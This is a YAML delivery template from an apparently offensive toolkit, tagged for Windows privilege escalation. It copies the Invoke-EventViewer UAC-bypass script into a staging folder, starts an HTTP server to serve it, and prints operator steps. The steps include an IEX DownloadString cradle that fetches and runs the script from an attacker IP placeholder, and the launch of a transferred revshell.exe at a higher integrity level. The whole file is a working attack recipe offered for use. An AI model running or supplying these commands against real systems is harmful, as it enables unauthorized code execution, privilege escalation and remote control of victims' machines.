metadata:
  filename: "deliver-windows-Invoke-EventViewer.ps1.yaml"
  tags: ["windows", "privesc"]
  created: "2025-03-29"
  authors: ["Unknown"]

content: |
  mkdir -p packstation/outbound; cp -n {{ tools_dir }}/uacbypass/Invoke-EventViewer.ps1 packstation/outbound/; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                      -----PowerShell-----                      '; \
  printf '%s\n' 'Preparation 1: Transfer a revshell.exe to the target ({{ delivery_path_windows }}\revshell.exe) and start the listener'; \
  printf '%s\n' "Deliver & Inject to memory: IEX (New-Object System.Net.Webclient).DownloadString('http://{{ attacker_ip }}:{{ delivery_outbound_port }}/Invoke-EventViewer.ps1')"; \
  printf '%s\n' 'Execute (It takes a few seconds to trigger the revshell): Invoke-EventViewer {{ delivery_path_windows }}\revshell.exe'; \
  printf '%s\n' 'NOTE: You should get a new revshell with a higher integrity level (but still the same user)'; \
  printf '%s\n' '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
